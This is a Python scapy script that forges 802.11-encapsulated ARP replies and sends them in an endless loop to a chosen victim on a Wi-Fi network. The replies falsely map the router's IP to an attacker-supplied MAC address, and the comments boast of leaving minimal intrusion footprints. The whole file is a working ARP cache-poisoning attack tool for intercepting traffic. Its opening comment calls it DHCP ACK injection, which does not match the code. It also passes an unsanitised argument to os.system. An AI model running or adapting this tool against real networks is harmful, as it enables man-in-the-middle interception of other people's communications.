#!/usr/bin/python 
# script to inject fake dhcp ack packets
import sys

if len(sys.argv) < 8:
    print 'Usage : ./injection.py interface bssid channel routerIp victimMac victimIp fakerouterMac '
    sys.exit()

import os
from scapy.all import *

# interface to send and receive 
conf.iface = sys.argv[1]
# parameters required to create a successful packet
bssid = sys.argv[2]
channel =  int(sys.argv[3])
routerIp = sys.argv[4]
victimMac = sys.argv[5]
victimIP = sys.argv[6]
fakerouterMac = sys.argv[7]

# setting the right channel to send packet
os.system('iwconfig ' + conf.iface + ' channel ' + str(channel))

# bpf filter used for sniffing qos-data packets sent by victim
filter = ' wlan addr2 ' + victimMac  + 'and type data subtype qos-data'

# using L2sockets as they are fast to implement
sock = conf.L2socket(iface =conf.iface)

# data rate at which packets will be sent
drate = 58.5
# random sequence number to be used 
sc = 25

# channel to frequency converter
def get_frequency(channel):
    if channel == 14:
        freq = 2484
    else:
        freq = 2407 + (channel * 5)

    freq_string = struct.pack("<h", freq)

    return freq_string

# this function returns radiotap header which contains channel frequency and data rate info
def get_radiotap_header(drate,ch):
    radiotap_packet = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna', notdecoded='\x00' + struct.pack("<h",drate*2)[0] + get_frequency(ch) + '\xc0\x00\xc0\x01\x00\x00')
    return radiotap_packet

# converts a mac address string into hexadecimal equivalent
def mac_to_bytes(mac):
    return ''.join(chr(int(x, 16)) for x in mac.split(':'))

# This function takes care of sequence number in Dot11 packet
def next_sc():
    global sc
    sc = (sc + 1) % 4096
    return sc * 16  # Fragment number -> right 4 bits

# creating spoofed arp request packet with minimal signs of intrusion
arpReq = get_radiotap_header(drate,channel) \
        / Dot11(subtype=8,type=2,addr1=victimMac,addr2=bssid,addr3=bssid,SC=next_sc()) \
        / Dot11QoS() \
        / LLC(dsap=170,ssap=170,ctrl=3) \
        / SNAP(OUI=0,code=2054) \
        / ARP(pdst=victimIP, psrc=routerIp,hwsrc=fakerouterMac,op='who-has')

#sock.send(arpReq)
#sock.send(arpReq)
#print(repr(arpReq))

# creating spoofed arp response packet with minimal footprints
arpReq = get_radiotap_header(drate,channel) \
        / Dot11(subtype=8,type=2,addr1=victimMac,addr2=bssid,addr3=bssid,SC=next_sc()) \
        / Dot11QoS() \
        / LLC(dsap=170,ssap=170,ctrl=3) \
        / SNAP(OUI=0,code=2054) \
        / ARP(pdst=victimIP,hwdst=victimMac, psrc=routerIp,hwsrc=fakerouterMac,op='is-at')

while 1:
    sock.send(arpReq)
    sock.send(arpReq)
    #print(repr(arpReq))


# callback function to handle all packets
#def cb(pkt):
#    pass

#try:
#    sniff(count=10000000,prn=cb,filter=filter)
#except KeyboardInterrupt:
#    sys.exit()